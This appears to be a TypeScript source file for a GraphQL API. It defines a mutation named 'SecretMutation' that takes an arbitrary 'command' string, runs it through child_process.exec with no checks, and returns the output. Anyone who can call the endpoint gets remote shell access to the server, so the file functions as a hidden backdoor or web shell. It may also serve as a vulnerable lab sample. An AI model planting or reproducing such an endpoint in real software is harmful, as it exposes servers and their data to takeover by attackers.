import {GraphQLObjectType, GraphQLString, GraphQLFieldConfig} from 'graphql'

import child_process from 'child_process';
import {promisify} from 'util';

const exec = promisify(child_process.exec);

var CommandOutputType = new GraphQLObjectType({
    name: 'CommandOutput',
    fields: {
        stdout: {
            type: GraphQLString
        },
        stderr: {
            type: GraphQLString
        }
    }
})

export var SecretMutation: GraphQLFieldConfig<any,any,any> = {
    type: CommandOutputType,
    args: {
        command: {
            type: GraphQLString
        }
    },
    resolve: async (_root: any, args: any, _info: any) => {
        let command = args.command;
        let results = await exec(command);
        return results;
    }
}